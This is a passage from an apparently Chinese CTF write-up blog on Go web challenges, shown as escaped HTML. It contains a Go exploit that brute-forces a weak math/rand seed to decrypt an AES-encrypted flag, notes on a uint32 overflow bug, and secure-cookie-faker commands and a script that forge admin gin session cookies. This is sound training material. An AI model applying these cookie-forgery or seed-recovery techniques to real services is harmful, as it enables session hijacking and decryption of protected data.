&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rawFlag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Challenge starting up&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">go&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:80&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag 被 AES CBC 加密，加密本身没问题，问题出在种子上&lt;/p>
&lt;p>种子生成是靠 &lt;code>rand.Seed(time.Now().UnixNano() &amp;amp; ^0x7FFFFFFFFEFFF000)&lt;/code> 完成，这样得到的种子很小 可以被我们爆破出来&lt;/p>
&lt;p>exp.go&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">hextext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914&amp;#34;&lt;/span> &lt;span style="color:#75715e">// Encrypted Flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">:=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">19777868&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCDecrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hextext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flagBytes&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Flag: %s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{int3rEst1ng_M4sk_paTt3rn}&lt;/code>&lt;/p>
&lt;h2 id="mathrand未调用seed默认种子为1">math/rand未调用Seed默认种子为1&lt;/h2>
&lt;h3 id="wmctf2020gogogo">[WMCTF2020]GOGOGO&lt;/h3>
&lt;p>参考：&lt;a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/">wp&lt;/a>&lt;/p>
&lt;h2 id="uint32整数溢出">uint32整数溢出&lt;/h2>
&lt;p>uint32的范围是0~4294967295&lt;/p>
&lt;h3 id="羊城杯2021checkin_go">[羊城杯2021]Checkin_Go&lt;/h3>
&lt;pre tabindex="0">&lt;code>u1, err1 := strconv.ParseUint(nowMoney,10,32)
u2, err2 := strconv.ParseUint(addMoney,10,32)
....
newMoney = uint32(u1) + uint32(u2)
&lt;/code>&lt;/pre>&lt;p>flag price是uint32，以admin身份（伪造cookie）加到溢出，变小，就可以买了&lt;/p>
&lt;p>参考：&lt;a href="https://yyz9.cn/2021/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AF2021-checkin_go%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/">wp&lt;/a>&lt;/p>
&lt;h2 id="gin框架伪造cookie">gin框架伪造cookie&lt;/h2>
&lt;h3 id="secure-cookie-faker">secure-cookie-faker&lt;/h3>
&lt;p>工具：&lt;a href="https://github.com/EddieIvan01/secure-cookie-faker">secure-cookie-faker&lt;/a>&lt;/p>
&lt;p>decode:&lt;/p>
&lt;pre tabindex="0">&lt;code>.\secure-cookie-faker.exe dec -c &amp;#34;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>有type detail的就是object string&lt;/p>
&lt;p>encode:&lt;/p>
&lt;pre tabindex="0">&lt;code>.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;{user: admin, id: 0[int]}&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>-o &lt;/code>: object string，its like a K-V map, it should have type hints&lt;/li>
&lt;li>&lt;code>-n&lt;/code> : cookie name, its required because the HMAC hash&amp;rsquo;s generation relies on it&lt;/li>
&lt;li>&lt;code>-k&lt;/code> : secret key(s), could be multiple: &lt;code>-k &amp;quot;key1, key2&amp;quot;&lt;/code>, the first is hash key, and the second is encrypt block key&lt;/li>
&lt;/ul>
&lt;p>when element&amp;rsquo;s type is &lt;code>string&lt;/code>, the type tag can be omitted&lt;/p>
&lt;p>type tag can only be &lt;code>int&lt;/code>, &lt;code>uint&lt;/code>, &lt;code>float&lt;/code>, &lt;code>bool&lt;/code>, &lt;code>string&lt;/code>, &lt;code>byte&lt;/code>&lt;/p>
&lt;p>change serializer&lt;/p>
&lt;pre tabindex="0">&lt;code>.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;some-string&amp;#34; -way json
.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;{id: 0[int]}&amp;#34; -way json
.\secure-cookie-faker.exe enc -n &amp;#34;mysession&amp;#34; -k &amp;#34;secret&amp;#34; -o &amp;#34;some-string&amp;#34; -way nop
.\secure-cookie-faker.exe dec -c &amp;#34;MTU2NjkxMjI4NXxleUoxYzJWeUlqb2lZV1J0YVc0aWZRbz18OibftwH33BZStXtep7TbN_mbyk8RftQe9t_wxCJXhHo=&amp;#34; -way json
&lt;/code>&lt;/pre>&lt;h3 id="脚本">脚本&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/gin-contrib/sessions&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/gin-contrib/sessions/cookie&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/gin-gonic/gin&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">gin&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Default&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">storage&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewStore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">randomChar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sessions&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sessions&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;o&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">storage&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">GET&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">cookieHandler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.0.0.0:8002&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">cookieHandler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">gin&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Context&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">sessions&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Default&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;uname&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 修改处
